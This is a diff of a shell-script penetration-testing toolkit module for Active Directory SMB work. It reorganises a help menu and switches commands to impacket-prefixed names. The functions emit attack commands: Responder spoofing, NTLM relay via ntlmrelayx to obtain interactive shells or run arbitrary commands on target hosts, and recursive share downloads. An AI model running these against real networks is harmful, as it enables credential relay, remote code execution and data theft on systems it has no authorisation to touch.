@@ -36,24 +36,37 @@ nb-ad-smb-null-smbclient-list-rec  list shares recursively
 
 AUTH Session
 ------------
-nb-ad-smb-user-smbmap              query with smbmap authenticated session
-nb-ad-smb-user-smbmap-list-rec     list shares recursively with authentication
 nb-ad-smb-user-cme-list            list shares with cme authenticated session
 nb-ad-smb-user-cme-spider          spider available shares on the remote host or subnet
+nb-ad-smb-user-samrdump            info using impacket
+nb-ad-smb-user-smbmap              query with smbmap authenticated session
+nb-ad-smb-user-smbmap-list-rec     list shares recursively with authentication
+nb-ad-smb-user-smbclient-list      list shares
+nb-ad-smb-user-smbclient-list-rec  list shares recursively
 
 Connecting to Service
 -------------------------------------
 nb-ad-smb-null-smbclient-connect   connect with a null session
 nb-ad-smb-user-smbclient-connect   connect with an authenticated session
 
-Other Commands
+Download / Upload
 -------------------------------------
+NULL Session
+------------
 nb-ad-smb-null-smbmap-download     download a file from a share
 nb-ad-smb-null-smbget-download-rec recursively download the SMB share
 nb-ad-smb-null-smbmap-upload       upload a file to a share
+AUTH Session
+------------
+nb-ad-smb-user-smbmap-download     download a file from a share
+nb-ad-smb-user-smbget-download-rec recursively download the SMB share
+nb-ad-smb-user-smbmap-upload       upload a file to a share
+
+Other Commands
+-------------------------------------
 nb-ad-smb-install                  installs dependencies
 nb-ad-smb-tcpdump                  capture traffic to and from a host
-nb-enum-user-smb-mount             mount an SMB share
+nb-ad-smb-user-smb-mount           mount an SMB share
 nb-ad-smb-responder                spoof and get responses using responder
 nb-ad-smb-net-use-null             print a net use statement for windows
 nb-ad-smb-nbtscan                  scan a local network 
@@ -64,8 +77,8 @@ nb-ad-smb-relay-install              installs dependencies
 nb-ad-smb-relay-enum                 identify hosts without smb signing
 nb-ad-smb-relay-ntlmrelay            relay the captured SMB requests by responder
 nb-ad-smb-relay-ntlmrelay-shell      get interactive shell
-nb-ad-smb-relay-ntlmrelay-command    execute a shell command on a target host using ntlmrelayx.py
-nb-ad-smb-relay-multirelay-command   responder's alternative to ntlmrelayx.py - execute a shell command on a target host
+nb-ad-smb-relay-ntlmrelay-command    execute a shell command on a target host using impacket-ntlmrelayx
+nb-ad-smb-relay-multirelay-command   responder's alternative to impacket-ntlmrelayx - execute a shell command on a target host
 
 DOC
 }
@@ -414,7 +427,7 @@ nb-enum-user-smb-mount() {
 nb-ad-smb-null-samrdump() {
   __check-project
   nb-vars-set-rhost
-  print -z "samrdump.py ${__RHOST}"
+  print -z "impacket-samrdump ${__RHOST}"
 }
 
 nb-ad-smb-responder() {
@@ -471,7 +484,7 @@ nb-ad-smb-relay-ntlmrelay() {
 	  __ask "Enter a targets list file"
 	  local targets && __askvar targets TARGETS
 
-    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support | tee $(__domadpath)/ntlmrelayx.txt"
+    print -z "sudo impacket-ntlmrelayx -tf ${targets} -smb2support | tee $(__domadpath)/ntlmrelayx.txt"
 }
 
 nb-ad-smb-relay-ntlmrelay-shell() {
@@ -479,7 +492,7 @@ nb-ad-smb-relay-ntlmrelay-shell() {
 	  __ask "Enter a targets list file"
 	  local targets && __askvar targets TARGETS
 
-    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -i | tee $(__domadpath)/ntlmrelayx-shell.txt"
+    print -z "sudo impacket-ntlmrelayx -tf ${targets} -smb2support -i | tee $(__domadpath)/ntlmrelayx-shell.txt"
 }
 
 nb-ad-smb-relay-ntlmrelay-command() {
@@ -488,7 +501,7 @@ nb-ad-smb-relay-ntlmrelay-command() {
 	  local targets && __askvar targets TARGETS
 	  local cm && __askvar cm COMMAND
 
-	  print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -c '$cm' | tee $(__domadpath)/ntlmrelayx-command.txt"
+	  print -z "sudo impacket-ntlmrelayx -tf ${targets} -smb2support -c '$cm' | tee $(__domadpath)/ntlmrelayx-command.txt"
 }
 
 nb-ad-smb-relay-multirelay-command() {
